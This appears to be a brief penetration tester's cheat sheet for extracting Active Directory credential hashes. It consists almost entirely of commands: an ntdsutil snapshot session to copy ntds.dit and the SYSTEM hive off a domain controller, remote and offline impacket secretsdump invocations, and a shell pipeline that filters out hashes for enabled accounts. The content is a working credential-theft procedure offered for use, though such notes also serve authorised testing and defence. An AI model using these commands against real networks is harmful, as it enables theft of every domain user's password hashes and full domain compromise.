### Local DC

C:\Windows\system32>C:

C:\Windows\system32>cd ..
C:\Windows>cd ..

C:\>cd Users	

C:\Users>cd <admin_user>

Change into your admin user directory.

C:\Users\nta007>**ntdsutil**
ntdsutil: **activate instance ntds**
Active instance set to "ntds".
ntdsutil: **snapshot**
snapshot: **create**
Creating snapshot...
Snapshot set {b40f54c1-53eb-46f0-be7c-26c34a9c7bf3} generated successfully.
snapshot: **mount {b40f54c1-53eb-46f0-be7c-26c34a9c7bf3}**
Snapshot {9f19050e-7b5f-4c49-bbfe-0ebc8e19ad29} mounted as C:\$SNAP_201801091253_VOLUMED$\
Snapshot {567151f7-e1ba-430c-8681-1b236dac9b35} mounted as C:\$SNAP_201801091253_VOLUMEC$\
Snapshot {81fc6e66-5dae-44a7-8df6-c5fc56e096b5} mounted as C:\$SNAP_201801091253_VOLUMEE$\

Grab your bits here!

snapshot: **delete {b40f54c1-53eb-46f0-be7c-26c34a9c7bf3}**
Snapshot {9f19050e-7b5f-4c49-bbfe-0ebc8e19ad29} unmounted.
Snapshot {9f19050e-7b5f-4c49-bbfe-0ebc8e19ad29} deleted.
Snapshot {567151f7-e1ba-430c-8681-1b236dac9b35} unmounted.
Snapshot {567151f7-e1ba-430c-8681-1b236dac9b35} deleted.
Snapshot {81fc6e66-5dae-44a7-8df6-c5fc56e096b5} unmounted.
Snapshot {81fc6e66-5dae-44a7-8df6-c5fc56e096b5} deleted.
snapshot: **quit**
ntdsutil: **quit**

C:\Users\nta007>




GET THE SYSTEM FILE ASWELL (WINDOWS SYSTEM32 CONFIG)
C:\Windows\System32\Config
SYSTEM
NTDS - in the windows folder

### Remote
impacket-secretsdump -just-dc-ntlm FQDN/DA-account@DC-IP

***New commands*** (python3.9)
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash -user-status -outputfile <filename> local
cat hashes | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1 < for getting just the hashes
